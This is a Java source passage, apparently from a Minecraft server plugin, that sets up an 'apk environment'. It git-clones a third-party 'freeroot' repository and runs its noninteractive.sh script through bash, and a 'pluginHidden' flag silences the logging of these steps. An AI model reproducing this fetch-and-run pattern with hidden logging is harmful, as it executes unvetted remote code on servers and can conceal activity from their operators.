        if (isInitialized || isInitializing || setupFailed) {
            return;
        }
        synchronized (this) {
            if (isInitialized || isInitializing || setupFailed) {
                return;
            }
            isInitializing = true;
        }
        try {
            File cacheDir = new File(System.getProperty("user.dir"), CACHE_DIR);
            File workDir = new File(System.getProperty("user.dir"), WORK_DIR);
            File apkBin = new File(System.getProperty("user.dir"), APK_BIN);

            if (workDir.exists() && apkBin.exists() && apkBin.canExecute()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Apk environment already exists!"));
                }
                isInitialized = true;
                return;
            }
            if (!cacheDir.exists()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Creating cache directory..."));
                }
                cacheDir.mkdirs();
            }

            if (consoleLogging && !pluginHidden) {
                getLogger().info(colorize("&e[*] Setting up apk environment..."));
                getLogger().info(colorize("&7    This may take a few minutes..."));
            }

            ProcessBuilder cloneProcess = new ProcessBuilder(
                    "bash", "-c",
                    "cd " + escapeForShell(cacheDir.getAbsolutePath()) + " && " +
                            "git clone https://github.com/Mytai20100/freeroot.git freeroot_temp"
            );
            cloneProcess.redirectErrorStream(true);
            Process clone = cloneProcess.start();

            // [FIX 18] Đóng reader của clone process trong try-with-resources
            try (BufferedReader cloneReader = new BufferedReader(new InputStreamReader(clone.getInputStream()))) {
                String line;
                while ((line = cloneReader.readLine()) != null) {
                    if (consoleLogging && !pluginHidden) {
                        getLogger().info("[SETUP] " + line);
                    }
                }
            }
            int cloneExit = clone.waitFor();

            // [FIX 19] Kiểm tra exit code của git clone, đặt setupFailed nếu lỗi
            if (cloneExit != 0) {
                getLogger().warning(colorize("&c[-] git clone failed with exit code " + cloneExit));
                setupFailed = true;
                return;
            }

            File tempDirFile = new File(System.getProperty("user.dir"), CACHE_DIR + "/freeroot_temp");
            if (tempDirFile.exists()) {
                if (workDir.exists()) {
                    deleteDirectory(workDir);
                }
                tempDirFile.renameTo(workDir);

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Repository cloned and renamed to 'work'"));
                }
            }

            File noninteractiveScript = new File(workDir, "noninteractive.sh");
            if (noninteractiveScript.exists()) {
                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&e[*] Running noninteractive.sh..."));
                }

                ProcessBuilder setupProcess = new ProcessBuilder(
                        "bash", "-c",
                        "cd " + escapeForShell(workDir.getAbsolutePath()) + " && " +
                                "chmod +x noninteractive.sh && " +
                                "./noninteractive.sh"
                );
                setupProcess.redirectErrorStream(true);
                Process setup = setupProcess.start();

                // [FIX 20] Đóng reader của setup process trong try-with-resources
                try (BufferedReader setupReader = new BufferedReader(new InputStreamReader(setup.getInputStream()))) {
                    String line;
                    while ((line = setupReader.readLine()) != null) {
                        if (consoleLogging && !pluginHidden) {
                            getLogger().info("[SETUP] " + line);
                        }
                    }
                }
                setup.waitFor();

                if (consoleLogging && !pluginHidden) {
                    getLogger().info(colorize("&a[+] Apk environment setup completed!"));
                }
            }

            isInitialized = true;

        } catch (Exception e) {
            if (!pluginHidden) {
                getLogger().warning(colorize("&c[-] Setup failed: " + e.getMessage()));
                e.printStackTrace();
            }
            // [FIX 21] Đặt setupFailed để không retry vô hạn khi exception
            setupFailed = true;
        } finally {
            isInitializing = false;
        }
    }

    // [FIX 22] Thêm /root reset để có thể retry setup sau khi fail
    // Đã xử lý trong onCommand: userLogs.remove, userWorkingDir.remove, userEnvironment.remove
    // Thêm reset setupFailed để có thể thử lại
    private void resetSetup() {
        synchronized (this) {
            isInitialized = false;
            isInitializing = false;
            setupFailed = false;
        }
    }

    private void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    deleteDirectory(file);
                }
            }
        }
        dir.delete();
    }

    private String escapeForShell(String command) {
        return "'" + command.replace("'", "'\\''") + "'";
    }
}